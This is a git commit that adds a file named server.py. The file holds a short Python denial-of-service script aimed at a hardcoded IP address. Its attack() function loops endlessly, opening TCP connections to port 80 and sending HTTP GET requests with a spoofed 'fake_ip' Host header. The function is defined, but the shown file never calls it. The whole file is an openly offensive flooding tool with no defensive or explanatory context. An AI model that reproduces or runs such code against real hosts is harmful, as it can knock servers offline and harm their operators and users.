f1655a2172f63e0c43a81724fc5f2322e40c2fbc
nebelisa <75169237+nebelisa@users.noreply.github.com>
2021-03-18 13:12:09 +0200

    Add files via upload

---
+++ server.py
@@ -0,0 +1,17 @@
+# start
+
+import socket
+import threading
+
+target = '93.73.155.209'
+fake_ip = '182.21.20.32'
+port = 80
+
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        s.close()
